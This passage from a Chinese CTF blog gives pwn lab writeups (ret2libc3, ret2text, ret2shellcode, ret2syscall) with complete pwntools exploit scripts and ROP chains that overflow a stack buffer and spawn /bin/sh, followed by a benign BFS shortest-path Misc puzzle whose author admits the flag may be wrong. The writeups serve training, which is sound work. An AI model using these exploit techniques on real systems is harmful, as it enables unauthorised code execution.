ret2libc3</h2><p>首先我们程序拖入ida，没有发现system函数，也没有发现”/bin/sh”，但是有put函数和__libc_start_main，我们可以采取溢出libc的版本号，然后算出libc中system函数的位置，然后把”/bin/sh”参数传入，其中注意再返回main函数时，请不要直接ret到main函数，不然会因为main参数未传入而导致程序崩溃，请跳转到_start函数，然后_start函数中可以传入参数并跳转到main</p><h3 id="exploit-py-2"><a href="#exploit-py-2" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("ret2libc3")</span><br><span class="line">elf = ELF("ret2libc3")</span><br><span class="line">libc = ELF("libc6_2.27-3ubuntu1_i386.so")</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = elf.got['__libc_start_main']</span><br><span class="line">__gmon_start__addr = elf.got['__gmon_start__']</span><br><span class="line">gets_addr = elf.plt['gets']</span><br><span class="line">puts_addr = elf.plt['puts']</span><br><span class="line">pop_edx_ret = 0x0804841d</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">libc_system_offset =  libc.symbols['system']-libc.symbols['__libc_start_main']</span><br><span class="line">print libc_system_offset</span><br><span class="line"></span><br><span class="line">payload = flat(['a'*112,puts_addr,pop_edx_ret,__libc_start_main_addr,puts_addr,start_addr,__gmon_start__addr,'\n'])</span><br><span class="line"></span><br><span class="line">sh.sendafter("it !?",payload)</span><br><span class="line"></span><br><span class="line">ret_text = sh.recv()</span><br><span class="line">libc_start_main_addr = u32(ret_text[:4])</span><br><span class="line">libc_system_addr = libc_start_main_addr + 148592</span><br><span class="line">print "[+]__libc_start_main : %x\n"%u32(ret_text[:4])</span><br><span class="line">print "[+]__gmon_start__addr : %x\n"%u32(ret_text[4:8])</span><br><span class="line"></span><br><span class="line">payload = flat(['a'*112,gets_addr,pop_edx_ret,bss_addr,libc_system_addr,pop_edx_ret,bss_addr])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline('//bin//sh\0')</span><br><span class="line">sh.interactive()</span><br><span class="line">~</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/10.png" class="lazyload"></a></p><h2 id="0x04-ret2text"><a href="#0x04-ret2text" class="headerlink" title="0x04 ret2text"></a>0x04 ret2text</h2><p>导入ida，发现system(“/bin/sh”)<br><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/7.png" class="lazyload"></a></p><p>checksec检查一下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></tbody></table></figure></div><p>只有NX保护，可以直接跳转到system函数</p><h3 id="溢出思路-1"><a href="#溢出思路-1" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>直接通过gets覆盖ret地址，直接跳转到system函数</p><h3 id="exploit-py-3"><a href="#exploit-py-3" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process("ret2text")</span><br><span class="line">elf = ELF("ret2text")</span><br><span class="line">system_addr = 0x0804863A</span><br><span class="line">payload = flat(['a'*112,system_addr,'a'*4])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-ret2shellcode"><a href="#0x05-ret2shellcode" class="headerlink" title="0x05 ret2shellcode"></a>0x05 ret2shellcode</h2><h3 id="溢出思路-2"><a href="#溢出思路-2" class="headerlink" title="溢出思路"></a>溢出思路</h3><p>将shellcode写入后，因为strcpy的原因，会将shellcode保存到非栈的区域，所以直接跳转到该区域就可以执行shellcode拿到shell</p><h3 id="exploit-py-4"><a href="#exploit-py-4" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process("./ret2shellcode")</span><br><span class="line">elf = ELF("ret2shellcode")</span><br><span class="line">shellcode_addr = 0x0804A080</span><br><span class="line">payload = flat([asm(shellcraft.sh()),'a'*(112-len(asm(shellcraft.sh()))),shellcode_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/8.png" class="lazyload"></a></p><h2 id="0x06-ret2syscall"><a href="#0x06-ret2syscall" class="headerlink" title="0x06 ret2syscall"></a>0x06 ret2syscall</h2><p>文件下载<a href="rop">rop</a><br>首先我们先导入IDA，然后F5反编译<br><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/1.png" class="lazyload"></a><br>我们用gdb进行调试，首先我们先生成较多的字符串来测试它ret_address的长度</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyclic 200    //复制</span><br><span class="line">gdb rop</span><br><span class="line">run</span><br><span class="line">quit</span><br></pre></td></tr></tbody></table></figure></div><p>然后会看到它的ret_address是非正常的数据（其实是我们输入的字符串的一部分）<br>然后我们将它提取出来，获取它的长度</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic -l 0x62616164</span><br></pre></td></tr></tbody></table></figure></div><p>这个指令输出 112，说明只要我们输入112个字符之后就可以控制住程序的流程了，想让它跳哪里就跳到哪里<br>但是让它跳哪里我们还不知道，所以我们需要一个工具 ROPgadget</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></tbody></table></figure></div><p>然后它会在最后构造一个python代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack</span><br><span class="line"># Padding goes here</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea060) # @ .data< span><br><span class="line">p += pack('<i', 0x080bb196) # pop eax ; ret< span><br><span class="line">p += '/bin'</span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea064) # @ .data + 4< span><br><span class="line">p += pack('<i', 0x080bb196) # pop eax ; ret< span><br><span class="line">p += '//sh'</span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08054590) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x080481c9) # pop ebx ; ret< span><br><span class="line">p += pack('<i', 0x080ea060) # @ .data< span><br><span class="line">p += pack('<i', 0x0806eb91) # pop ecx ; ebx ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080ea060) # padding without overwrite ebx< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08054590) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret < span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x08049421) # int 0x80< span><br></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></pre></td></tr></tbody></table></figure></div><p>下面给出exploit</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack</span><br><span class="line"># Padding goes here</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea060) # @ .data< span><br><span class="line">p += pack('<i', 0x080bb196) # pop eax ; ret< span><br><span class="line">p += '/bin'</span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea064) # @ .data + 4< span><br><span class="line">p += pack('<i', 0x080bb196) # pop eax ; ret< span><br><span class="line">p += '//sh'</span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08054590) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0809a4ad) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x080481c9) # pop ebx ; ret< span><br><span class="line">p += pack('<i', 0x080ea060) # @ .data< span><br><span class="line">p += pack('<i', 0x0806eb91) # pop ecx ; ebx ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080ea060) # padding without overwrite ebx< span><br><span class="line">p += pack('<i', 0x0806eb6a) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080ea068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08054590) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807b5bf) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x08049421) # int 0x80< span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./rop")</span><br><span class="line">shell_text_address = 0x080BE408</span><br><span class="line">junk = 112*'a'</span><br><span class="line">ret_address = 0x08048E24</span><br><span class="line">payload = junk + p</span><br><span class="line">sh.sendafter("do?",payload);</span><br><span class="line">print sh.recv()</span><br><span class="line">sh.interactive()</span><br></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></pre></td></tr></tbody></table></figure></div><p><a href="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/13/CTF-Wiki-ret2libc%E7%B3%BB%E5%88%97/3.png" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年4月西湖杯-Misc</title>
      <link href="/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Misc/"/>
      <url>/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Misc/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x1-最短路径"><a href="#0x1-最短路径" class="headerlink" title="0x1 最短路径"></a>0x1 最短路径</h3><h5 id="资深宅“flag-”在朋友邀请下，参加了一场聚会。"><a href="#资深宅“flag-”在朋友邀请下，参加了一场聚会。" class="headerlink" title="资深宅“flag{”在朋友邀请下，参加了一场聚会。"></a>资深宅“flag{”在朋友邀请下，参加了一场聚会。</h5><h5 id="在聚会上看到了美女“75D-”-一时心花荡漾、不能自己，坚信彼此就是天造地设的一双。"><a href="#在聚会上看到了美女“75D-”-一时心花荡漾、不能自己，坚信彼此就是天造地设的一双。" class="headerlink" title="在聚会上看到了美女“75D}”,一时心花荡漾、不能自己，坚信彼此就是天造地设的一双。"></a>在聚会上看到了美女“75D}”,一时心花荡漾、不能自己，坚信彼此就是天造地设的一双。</h5><h5 id="想通过层层朋友的关系认识她，却无奈性格问题，不敢劳师动众。"><a href="#想通过层层朋友的关系认识她，却无奈性格问题，不敢劳师动众。" class="headerlink" title="想通过层层朋友的关系认识她，却无奈性格问题，不敢劳师动众。"></a>想通过层层朋友的关系认识她，却无奈性格问题，不敢劳师动众。</h5><h5 id="好在朋友帮忙搞到一张聚会人员关系图，如下："><a href="#好在朋友帮忙搞到一张聚会人员关系图，如下：" class="headerlink" title="好在朋友帮忙搞到一张聚会人员关系图，如下："></a>好在朋友帮忙搞到一张聚会人员关系图，如下：</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[('FloraPrice','E11'),('FloraPrice','E9'),('FloraPrice','75D}'),('NoraFayette','E11'),('NoraFayette','E10'),('NoraFayette','E13'),('NoraFayette','E12'),('NoraFayette','E14'),('NoraFayette','E9'),('NoraFayette','E7'),('NoraFayette','E6'),('E10','SylviaAvondale'),('E10','MyraLiddel'),('E10','HelenLloyd'),('E10','KatherinaRogers'),('VerneSanderson','E7'),('VerneSanderson','E12'),('VerneSanderson','E9'),('VerneSanderson','E8'),('E12','HelenLloyd'),('E12','KatherinaRogers'),('E12','SylviaAvondale'),('E12','MyraLiddel'),('E14','SylviaAvondale'),('E14','75D}'),('E14','KatherinaRogers'),('FrancesAnderson','E5'),('FrancesAnderson','E6'),('FrancesAnderson','E8'),('FrancesAnderson','E3'),('DorothyMurchison','E9'),('DorothyMurchison','E8'),('EvelynJefferson','E9'),('EvelynJefferson','E8'),('EvelynJefferson','E5'),('EvelynJefferson','E4'),('EvelynJefferson','E6'),('EvelynJefferson','E1'),('EvelynJefferson','E3'),('EvelynJefferson','E2'),('RuthDeSand','E5'),('RuthDeSand','E7'),('RuthDeSand','E9'),('RuthDeSand','E8'),('HelenLloyd','E11'),('HelenLloyd','E7'),('HelenLloyd','E8'),('OliviaCarleton','E11'),('OliviaCarleton','E9'),('EleanorNye','E5'),('EleanorNye','E7'),('EleanorNye','E6'),('EleanorNye','E8'),('E9','TheresaAnderson'),('E9','PearlOglethorpe'),('E9','KatherinaRogers'),('E9','SylviaAvondale'),('E9','MyraLiddel'),('E8','TheresaAnderson'),('E8','PearlOglethorpe'),('E8','KatherinaRogers'),('E8','SylviaAvondale'),('E8','BrendaRogers'),('E8','LauraMandeville'),('E8','MyraLiddel'),('E5','TheresaAnderson'),('E5','BrendaRogers'),('E5','LauraMandeville'),('E5','CharlotteMcDowd'),('E4','CharlotteMcDowd'),('E4','TheresaAnderson'),('E4','BrendaRogers'),('E7','TheresaAnderson'),('E7','SylviaAvondale'),('E7','BrendaRogers'),('E7','LauraMandeville'),('E7','CharlotteMcDowd'),('E6','TheresaAnderson'),('E6','PearlOglethorpe'),('E6','BrendaRogers'),('E6','LauraMandeville'),('E1','LauraMandeville'),('E1','BrendaRogers'),('E3','TheresaAnderson'),('E3','BrendaRogers'),('E3','LauraMandeville'),('E3','CharlotteMcDowd'),('E3','flag{'),('E2','LauraMandeville'),('E2','TheresaAnderson'),('KatherinaRogers','E13'),('E13','SylviaAvondale')]</span><br></pre></td></tr></tbody></table></figure></div><h6 id="你能在让最少人知道的情况下，帮助flag先生联系上75D小姐姐吗？"><a href="#你能在让最少人知道的情况下，帮助flag先生联系上75D小姐姐吗？" class="headerlink" title="你能在让最少人知道的情况下，帮助flag先生联系上75D小姐姐吗？"></a>你能在让最少人知道的情况下，帮助flag先生联系上75D小姐姐吗？</h6><h6 id="求节点“flag-”到“75D”的最短路径，即为flag，比如：flag-E3AliceBobXXXXXXXXXXXXXXXX75D"><a href="#求节点“flag-”到“75D”的最短路径，即为flag，比如：flag-E3AliceBobXXXXXXXXXXXXXXXX75D" class="headerlink" title="求节点“flag{”到“75D”的最短路径，即为flag，比如：flag{E3AliceBobXXXXXXXXXXXXXXXX75D}"></a>求节点“flag{”到“75D”的最短路径，即为flag，比如：flag{E3AliceBobXXXXXXXXXXXXXXXX75D}</h6><p>我是采用BFS算法，由于我输入的数据还不完整，所以可能会存在flag错误</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import heapq</span><br><span class="line">import math</span><br><span class="line">graph = {</span><br><span class="line">"FloraPrice":{'E11','E9','75D}'},</span><br><span class="line">"NoraFayette":{'E11','E10','E13','E12','E14','E9','E7','E6'},</span><br><span class="line">"E10":{'SylviaAvondale','MyraLiddel','HelenLloyd','KatherinaRogers'},</span><br><span class="line">"VerneSanderson":{'E7','E12','E9','E8'},</span><br><span class="line">"E12":{'HelenLloyd','KatherinaRogers','SylviaAvondale','MyraLiddel'},</span><br><span class="line">"E14":{'SylviaAvondale','75D}','KatherinaRogers'},</span><br><span class="line">"FrancesAnderson":{'E5','E6','E8','E3'},</span><br><span class="line">"DorothyMurchison":{'E9','E8'},</span><br><span class="line">"EvelynJefferson":{'E9','E8','E5','E4','E6','E1','E3','E2'},</span><br><span class="line">"RuthDeSand":{'E5','E7','E9','E8'},</span><br><span class="line">"HelenLloyd":{'E11','E7','E8'},</span><br><span class="line">"OliviaCarleton":{'E11','E9'},</span><br><span class="line">"EleanorNye":{'E5','E7','E6','E8'},</span><br><span class="line">"E9":{'TheresaAnderson','PearlOglethorpe','KatherinaRogers','SylviaAvondale','MyraLiddel',"EvelynJefferson","FloraPrice"},</span><br><span class="line">"E8":{'TheresaAnderson','PearlOglethorpe','KatherinaRogers','SylviaAvondale','BrendaRogers','LauraMandeville','MyraLiddel',"HelenLloyd","EvelynJefferson"},</span><br><span class="line">"E5":{'TheresaAnderson','BrendaRogers','LauraMandeville','CharlotteMcDowd',"EvelynJefferson","EvelynJefferson"},</span><br><span class="line">"E4":{'CharlotteMcDowd','TheresaAnderson','BrendaRogers',"EvelynJefferson"},</span><br><span class="line">"E7":{'TheresaAnderson','SylviaAvondale','BrendaRogers','LauraMandeville','CharlotteMcDowd',"RuthDeSand","HelenLloyd"},</span><br><span class="line">"E6":{'TheresaAnderson','PearlOglethorpe','BrendaRogers','LauraMandeville',"EvelynJefferson"},</span><br><span class="line">"E1":{'LauraMandeville','BrendaRogers',"EvelynJefferson"},</span><br><span class="line">"E3":{'TheresaAnderson','BrendaRogers','LauraMandeville','CharlotteMcDowd','flag{',"EvelynJefferson"},</span><br><span class="line">"flag{":{"E3"},</span><br><span class="line">"TheresaAnderson":{"E3","E8","E9","E5","E7","E6","E3"},</span><br><span class="line">"BrendaRogers":{"E6","E3","E7","E5","E1","E3","E8"},</span><br><span class="line">"CharlotteMcDowd":{"E5","E3","E7","E4"},</span><br><span class="line">"LauraMandeville":{"E1","E3","E7","E8"},</span><br><span class="line">"SylviaAvondale":{"E7","E9","E8","E12","E10","E14"},</span><br><span class="line">"MyraLiddel":{"E9","E12","E10"},</span><br><span class="line">"PearlOglethorpe":{"E9","E8"},</span><br><span class="line">"75D}":{"E14","FloraPrice"},</span><br><span class="line">"E2":{'LauraMandeville','TheresaAnderson',"EvelynJefferson"},</span><br><span class="line">"E11":{"HelenLloyd","FloraPrice"},</span><br><span class="line">"KatherinaRogers":{'E13',"E14","E10"},</span><br><span class="line">"E13":{'SylviaAvondale',"OliviaCarleton","NoraFayette"}</span><br><span class="line">}</span><br><span class="line">def BFS(graph,s):</span><br><span class="line">queue = []</span><br><span class="line">queue.append(s)</span><br><span class="line">seen = set()</span><br><span class="line">seen.add(s)</span><br><span class="line">parent = {s: None}</span><br><span class="line">while(len(queue)>0):</span><br><span class="line">vertex = queue.pop(0)</span><br><span class="line">nodes = graph[vertex]</span><br><span class="line">for w in nodes:</span><br><span class="line">if w not in seen:</span><br><span class="line">queue.append(w)</span><br><span class="line">seen.add(w)</span><br><span class="line">parent[w] = vertex</span><br><span class="line">return parent</span><br><span class="line">parent = BFS(graph,"flag{")</span><br><span class="line">v='75D}'</span><br><span class="line">while v!=None:</span><br><span class="line">print(v)</span><br><span class="line">v=parent[v]</span><br></pre></td></tr></tbody></table></figure></div><p>运行即可拿到flag </p><h4 id="flag-E3EvelynJeffersonE9FloraPrice75D"><a href="#flag-E3EvelynJeffersonE9FloraPrice75D" class="headerlink" title="flag{E3EvelynJeffersonE9FloraPrice75D}"></a>flag{E3EvelynJeffersonE9FloraPrice75D}</h4><h3 